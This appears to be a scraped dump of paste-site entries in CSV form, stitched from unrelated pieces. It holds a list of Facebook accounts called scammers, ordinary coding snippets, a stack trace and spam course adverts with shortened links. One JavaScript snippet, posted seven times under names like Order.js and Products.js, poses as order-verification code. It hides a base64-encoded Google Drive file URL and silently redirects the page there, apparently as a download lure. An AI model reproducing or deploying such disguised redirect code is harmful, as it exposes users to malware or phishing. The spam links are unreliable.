https://www.facebook.com/Anonymouscollectives
https://www.facebook.com/AnonymousCollectivess
https://www.facebook.com/profile.php?id=61555356144837
https://www.facebook.com/profile.php?id=61551932765888
https://www.facebook.com/profile.php?id=100089967511654
https://www.facebook.com/profile.php?id=100091397064102
https://www.facebook.com/profile.php?id=61551225836297
https://www.facebook.com/profile.php?id=100082151810143
https://www.facebook.com/profile.php?id=100091957312000
https://www.facebook.com/profile.php?id=100078382782534
https://www.facebook.com/Collective.Anonymous
https://www.facebook.com/profile.php?id=100093066608942
https://www.facebook.com/mirahkind1
https://www.facebook.com/Hacktivists2
https://www.facebook.com/anonymous.collective.959288/
------------------------------------------------------------------------
And some of you have these Scammers on your friend list...
https://www.facebook.com/profile.php?id=100093659842868
https://www.facebook.com/profile.php?id=100080990775205
https://www.facebook.com/weareanonymous2024.wasawarmup2025.wetakeover/
https://www.facebook.com/krakendavid91/
#OpDown
#scammers
#Anonymous
#RedCult
#AnonGhost
#GhostSec
#OpFakeAnon
#ᵃⁿºⁿ๖ۣۜǥнσˢτ 🎩"
mm6gipqV,Untitled,jm33,JavaScript,Wednesday 16th of April 2025 04:29:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/88100/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Emyr5Q4m,copy,HappySunChild,Lua,Wednesday 16th of April 2025 04:26:17 PM CDT,"if not turtle then
	return
end

term.clear()
term.setCursorPos(1, 1)

if not fs.exists(""disk/copy"") then
	printError(""No copy directory."")

	return
end

print(""copying files..."")

local files = fs.list(""disk/copy"")

for _, file in ipairs(files) do
	print(""copying"", file)

	local path = ""disk/copy/"" .. file
	local dest = ""/"" .. file

	if fs.exists(dest) then
		fs.delete(dest)
	end

	fs.copy(path, dest)
end
"
UvpJWi9K,Untitled,UsSe3wa,Python,Wednesday 16th of April 2025 04:18:18 PM CDT,"import numpy as np


def gaussian_elimination(arr, b):
    arr = np.array(arr, dtype=float)
    b = np.array(b, dtype=float)
    n = len(b)

    for k in range(n - 1):
        for i in range(k + 1, n):
            factor = arr[i][k] / arr[k][k]

            arr[i][k:] -= factor * arr[k][k:]
            b[i] -= factor * b[k]

    x = np.zeros(n)
    for i in range(n - 1, -1, -1):
        x[i] = (b[i] - np.dot(arr[i][i + 1 :], x[i + 1 :])) / arr[i][i]

    return x


lines = int(input(""Input number of equations: ""))
print()
nums = int(input(""Input number of unknowns: ""))

arr = np.zeros((lines, nums), dtype=float)
b = np.zeros(lines, dtype=float)
print(""Input matrix A by rows like: x y z ... = b"")
for i in range(lines):
    row = list(map(int, input().split()))
    for j in range(nums):
        arr[i][j] = row[j]

print(""Input vector b"")
b_input = list(map(int, input().split()))
for i in range(lines):
    b[i] = b_input[i]
print(""\nBefore:"")
print(arr)
print(""\nVector b:"")
print(b)

result = gaussian_elimination(arr, b)

print(""\nAfter:"")
print(arr)
print(""\nSolution:"")
print(result)
"
WWTc8ENU,Learn Javascript without the hassle!,f0f077,JavaScript,Wednesday 16th of April 2025 04:15:08 PM CDT,"Learn Javascript without the hassle!
Learn everything you need to know to master JavaScript, without the nonsense.
What you will learn
Create your first algorithms in Javascript
Create interaction with the Internet user on your web pages
Create powerful animations on your web pages
Master the main concepts related to Javascript
for more:https://linkrex.net/3WVWv9"
wLFcxHCs,Products.js,zebmekey,JavaScript,Wednesday 16th of April 2025 04:13:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07465/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2GQup1T2,ACSII Art  F-u (banner),RebelRose,Bash,Wednesday 16th of April 2025 04:10:35 PM CDT,"#!/data/data/com.termux/files/usr/bin/env zsh

c1=""\e[1;34m"" # Green
c2=""\e[39m""   # Wite
STOP=""\e[0m""                                     

LOGO=""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣦⡄⣿⣿⡇⢠⣶⡄⢀⣤⡀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⣀⣀⣀⣀
⢀⣠⡄⣿⣿⣧⣿⣿⣧⣿⣿⣧⣼⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣾⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⣿⣿⣿⣿⡄⠀⠀⠀⢠⣿⣿⣿⣿
⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠸⣿⣿⣿⣿⣶⣶⣶⣿⣿⣿⣿⠇
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠈⠻⠿⣿⣿⣿⣿⣿⠿⠟⠁⠀
  \033[1;92mHello D34D₹⁰S3.....
""
printf ""${c1}${LOGO}${STOP}"""
iN4fgRvN,20 JavaScript Projects,f0f077,JavaScript,Wednesday 16th of April 2025 03:59:51 PM CDT,"20 JavaScript Projects
Improve your JavaScript skills.
What you will learn
The JavaScript language
Using APIs
Do really fun and educational projects
Use loops, conditions
Coding in Modern JavaScript
for more:https://linkrex.net/Uwh02gQ058"
gfTB3YsV,[NP] Log Processor,dzocesrce,Java,Wednesday 16th of April 2025 03:59:30 PM CDT,"import java.util.ArrayList;
import java.util.Scanner;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Arrays;
import java.util.Random;
import java.util.Comparator;
import java.util.stream.Collectors;

interface ILog{
    String getType();

    String getMessage();

    void setMessage(String newMessage);

    long getTimestamp();
    //TODO write methods definitions here;
}

interface LogProcessor<T> {
ArrayList<T> processLogs(ArrayList<T> logs);
}

class LogSystem<T extends ILog> {
    ArrayList<T> logsList;

    public LogSystem(ArrayList<T> logs) {
        this.logsList = logs;
    }
    //TODO add instance variable(s)

//TODO constructor

void printResults() {

    //TODO define concrete log processors with lambda expressions
       LogProcessor<T> firstLogProcessor = processor->(ArrayList<T>) logsList.stream().filter(i->i.getType().equals(""INFO"")).collect(Collectors.toList());
    //Processor that returns only the logs that have type INFO
    LogProcessor<T> secondLogProcessor = processor->(ArrayList<T>) logsList.stream().filter(i->i.getMessage().length()<100).collect(Collectors.toList());

    LogProcessor<T> thirdLogProcessor = processor->(ArrayList<T>) logsList.stream().sorted(Comparator.comparing(ILog::getTimestamp)).collect(Collectors.toList());
   System.out.println(""RESULTS FROM THE FIRST LOG PROCESSOR"");
    firstLogProcessor.processLogs(logsList).forEach(l -> System.out.println(l.toString()));

    System.out.println(""RESULTS FROM THE SECOND LOG PROCESSOR"");
    secondLogProcessor.processLogs(logsList).forEach(l -> System.out.println(l.toString()));

    System.out.println(""RESULTS FROM THE THIRD LOG PROCESSOR"");
    thirdLogProcessor.processLogs(logsList).forEach(l -> System.out.println(l.toString()));
}
}

class RealLog implements ILog, Comparable<RealLog> {
    String type;
    String message;
    long timestamp;
    static Random rdm = new Random();
    static int index = 100;

    public RealLog(String type, String message, long timestamp) {
        this.type = type;
        this.message = message;
        this.timestamp = timestamp;
    }

    @Override
    public int compareTo(RealLog o) {
        return Long.compare(this.timestamp, o.timestamp);
    }

    @Override
    public String getType() {
        return type;
    }

    @Override
    public String getMessage() {
        return message;
    }

    @Override
    public void setMessage(String newMessage) {
        this.message = newMessage;
    }


    @Override
    public long getTimestamp() {
        return timestamp;
    }

    public static RealLog createLog(String line) {
        String[] parts = line.split(""\\s+"");
        String date = parts[0] + ""T"" + parts[1];
        LocalDateTime ldt = LocalDateTime.parse(date, DateTimeFormatter.ISO_LOCAL_DATE_TIME);
        ZoneId zoneId = ZoneId.systemDefault();
        long timestamp = ldt.atZone(zoneId).toEpochSecond() * 1000 + index;
        ++index;
        String type = parts[3];
        String message = Arrays.stream(parts).skip(4).collect(Collectors.joining("" ""));
        return new RealLog(type, message, timestamp);
    }

    @Override
    public String toString() {
        return String.format(""%d [%s] %s"", timestamp, type, message);
    }
}

class DummyLog implements ILog, Comparable<DummyLog> {
    String type;
    String message;
    long timestamp;

    public DummyLog(String type, String message, long timestamp) {
        this.type = type;
        this.message = message;
        this.timestamp = timestamp;
    }

    @Override
    public int compareTo(DummyLog o) {
        return Long.compare(this.getTimestamp(), o.getTimestamp());
    }

    @Override
    public String getType() {
        return type;
    }

    @Override
    public String getMessage() {
        return message;
    }

    @Override
    public void setMessage(String newMessage) {
        this.message = message;
    }

    @Override
    public long getTimestamp() {
        return timestamp;
    }

    public static DummyLog createLog(String line) {
        String[] parts = line.split(""\\s+"");
        return new DummyLog(parts[0], parts[1], Long.parseLong(parts[2]));
    }

    @Override
    public String toString() {
        return ""DummyLog{"" +
                ""type='"" + type + '\'' +
                "", message='"" + message + '\'' +
                "", timestamp="" + timestamp +
                '}';
    }
}

public class LoggerTest {
    public static void main(String[] args) {

        Scanner sc = new Scanner(System.in);

        int firstCount = Integer.parseInt(sc.nextLine());

        ArrayList<RealLog> realLogs = IntStream.range(0, firstCount)
                .mapToObj(i -> RealLog.createLog(sc.nextLine()))
                .collect(Collectors.toCollection(ArrayList::new));

        int secondCount = Integer.parseInt(sc.nextLine());

        ArrayList<DummyLog> dummyLogs = IntStream.range(0, secondCount)
                .mapToObj(i -> DummyLog.createLog(sc.nextLine()))
                .collect(Collectors.toCollection(ArrayList::new));

        LogSystem<RealLog> realLogSystem = new LogSystem<>(realLogs);
        LogSystem<DummyLog> dummyLogSystem = new LogSystem<>(dummyLogs);

        System.out.println(""===REAL LOGS SYSTEM RESULTS==="");
        realLogSystem.printResults();
        System.out.println(""===DUMMY LOGS SYSTEM RESULTS==="");
        dummyLogSystem.printResults();

    }
}"
mQUiQfAd,Order.js,zebmekey,JavaScript,Wednesday 16th of April 2025 03:57:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31374/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iLMn4Bfz,2025-04-16T15:48:44.775936,powerampache,PHP,Wednesday 16th of April 2025 03:48:45 PM CDT,"1.01-79-play (79) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 404
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError Invalid response code 404 - Not Found - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 404 - Not Found
 {""headerFields"":{""null"":[""HTTP/1.1 404 Not Found""],""Connection"":[""keep-alive""],""Content-Type"":[""application/json; charset\u003dUTF-8""],""Date"":[""Wed, 16 Apr 2025 20:48:45 GMT""],""Server"":[""nginx""],""Transfer-Encoding"":[""chunked""],""X-Android-Received-Millis"":[""1744836524767""],""X-Android-Response-Source"":[""NETWORK 404""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744836524723""],""X-Frame-Options"":[""SAMEORIGIN""]},""responseBody"":[],""responseCode"":404,""responseMessage"":""Not Found"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 404"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]}"
N4wtMM0b,JavaScript for Accelerated Progress,f0f077,JavaScript,Wednesday 16th of April 2025 03:45:25 PM CDT,"JavaScript for Accelerated Progress
Discover the Secrets to Mastering JavaScript and Building High-Performance Web Applications
What you will learn
The most popular Javascript course on the French market with a very good overall rating.
You don't need to get lost in the middle of +12h, we focus more on the tools and methods used in the quality approach in teaching.
for more:https://linkrex.net/QffYkT"
KGVVYgvP,Market.js,zebmekey,JavaScript,Wednesday 16th of April 2025 03:42:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54093/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LC8YjAgQ,Untitled,zebmekey,JavaScript,Wednesday 16th of April 2025 03:27:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26671/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KuxrwuvV,Products.js,zebmekey,JavaScript,Wednesday 16th of April 2025 03:11:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62684/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WF0ziuCU,Untitled,d3l3t3,Python,Wednesday 16th of April 2025 03:06:21 PM CDT,"import pandas as pd
import numpy as np
import os
from sklearn.svm import SVC
from sklearn.model_selection import StratifiedKFold
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import roc_auc_score
from sklearn.linear_model import LogisticRegression
from sklearn.feature_selection import SelectFromModel
from datetime import datetime
import json

DATA_DIR = 'dataset/'
TRAIN_FILE = os.path.join(DATA_DIR, 'kaggle_train.csv')
TEST_FILE = os.path.join(DATA_DIR, 'kaggle_test.csv')
LOG_FILE = 'svc_cv_log.txt'
OUTPUT_FILENAME = 'submission_svc_fixed_cv.csv'
MODEL_NAME = ""SVC""
SEED = 42
L1_C_VAL = 0.5
FEATURE_SETUP_NAME = f""L1_C{L1_C_VAL}""
N_SPLITS = 20

FIXED_PARAMS = {""kernel"": ""linear"",""C"": 0.025,""random_state"": SEED,""class_weight"": ""balanced"",""probability"": True}
np.random.seed(SEED)

n_features = 318
feature_cols = [f'feature_{i}' for i in range(n_features)]

df_train_raw = pd.read_csv(TRAIN_FILE, header=None)
df_train_raw.columns = ['target'] + feature_cols
df_test = pd.read_csv(TEST_FILE, header=None)
df_test.columns = ['ID'] + feature_cols
test_ids = df_test['ID']
df_test_features = df_test[feature_cols]

df_train_cleaned = df_train_raw.dropna(subset=['target'])
valid_targets = [0.0, 1.0, 0, 1]
df_train_cleaned = df_train_cleaned[df_train_cleaned['target'].isin(valid_targets)].copy()
df_train_cleaned['target'] = df_train_cleaned['target'].astype(int)
y = df_train_cleaned['target']
X = df_train_cleaned[feature_cols]
X_test = df_test_features

X = X.fillna(X.mean())
X_test = X_test.fillna(X.mean())

print(f""X={X.shape}, y={y.shape}, X_test={X_test.shape}"")

scaler_fs = StandardScaler()
X_scaled_fs = scaler_fs.fit_transform(X)

l1_model = LogisticRegression(C=L1_C_VAL, penalty='l1', solver='liblinear', random_state=SEED, max_iter=200, class_weight='balanced')
selector = SelectFromModel(l1_model, threshold=1e-5)
selector.fit(X_scaled_fs, y)

l1_selected_mask = selector.get_support()
num_l1_features = l1_selected_mask.sum()
print(f""Selected {num_l1_features} features."")

X_selected = X.loc[:, l1_selected_mask]
X_test_selected = X_test.loc[:, l1_selected_mask]

oof_auc_scores = []
cv = StratifiedKFold(n_splits=N_SPLITS, shuffle=True, random_state=SEED)

for fold, (train_idx, val_idx) in enumerate(cv.split(X_selected, y)):
    X_train_fold, X_val_fold = X_selected.iloc[train_idx], X_selected.iloc[val_idx]
    y_train_fold, y_val_fold = y.iloc[train_idx], y.iloc[val_idx]

    scaler_cv = StandardScaler()
    X_train_scaled_fold = scaler_cv.fit_transform(X_train_fold)
    X_val_scaled_fold = scaler_cv.transform(X_val_fold)

    model_fold = SVC(**FIXED_PARAMS)
    model_fold.fit(X_train_scaled_fold, y_train_fold)
    val_proba = model_fold.predict_proba(X_val_scaled_fold)[:, 1]
    fold_auc = roc_auc_score(y_val_fold, val_proba)
    oof_auc_scores.append(fold_auc)

avg_cv_auc = np.mean(oof_auc_scores) if oof_auc_scores else 0.0
std_cv_auc = np.std(oof_auc_scores) if oof_auc_scores else 0.0
print(f""Average CV AUC: {avg_cv_auc:.5f}"")
print(f""Std Dev CV AUC: {std_cv_auc:.5f}"")

final_scaler = StandardScaler()
X_train_scaled_final = final_scaler.fit_transform(X_selected)
X_test_scaled_final = final_scaler.transform(X_test_selected)

final_model = SVC(**FIXED_PARAMS)
training_successful = False
train_auc = 0.0
test_preds = np.zeros(len(X_test_selected))

final_model.fit(X_train_scaled_final, y)
train_proba = final_model.predict_proba(X_train_scaled_final)[:, 1]
train_auc = roc_auc_score(y, train_proba)
test_preds = final_model.predict_proba(X_test_scaled_final)[:, 1]
print(f""Final model Train AUC: {train_auc:.5f}"")
training_successful = True

submission_df = pd.DataFrame({'ID': test_ids, 'Labels': test_preds})
submission_df['ID'] = submission_df['ID'].astype(int)
submission_df['Labels'] = submission_df['Labels'].astype(float)
submission_df.to_csv(OUTPUT_FILENAME, index=False, float_format='%.8f')
print(f""Submission saved to: {OUTPUT_FILENAME}"")"
WgrCqhra,Order.js,zebmekey,JavaScript,Wednesday 16th of April 2025 02:56:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56373/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gRHuvV0V,Untitled,dllbridge,C,Wednesday 16th of April 2025 02:46:54 PM CDT,"


#include  <iostream>
#include      <list>
#include     <ctime>
#include   <iomanip>
#include   <cstdlib>
using namespace std;


void monitor(list<int> &r);

//////////////////////////////////////////////////////////////  27, 195
int main()                                                  //  
{ 

    srand(time(0));

 	list<int> L_1;
    
    int n = 0;

   
	for(int i = 0; i < 20; i++)
	{

		
		n = rand()%200;
		
		L_1.push_back(n); 
		
	}
	
    monitor(L_1);

}





///////////////////////////////////////////////////////////////
void monitor(list<int> &r)
{
	
     int   n_min = 0,
           n_Max = 0,	
           n        ;

    list<int>::iterator it;
    
    it = r.begin();

	for(int i = 0; i < 20; i++)
	{
		n = *it;
           
        cout << setw(3) <<  i << "") n = "" << setw(3) << n << endl;   
        
		if( i == 0 ) n_min = n_Max = n;
		else
		{
		    if(n > n_Max) n_Max = n;
		    if(n < n_min) n_min = n;		    
	    } 
		
		it ++; 
    }	         
	cout << "" - - -  - - - -  - - - \n"";
	cout << ""n_Max = "" << n_Max << endl;
	cout << ""n_min = "" << n_min << endl;		
}

"
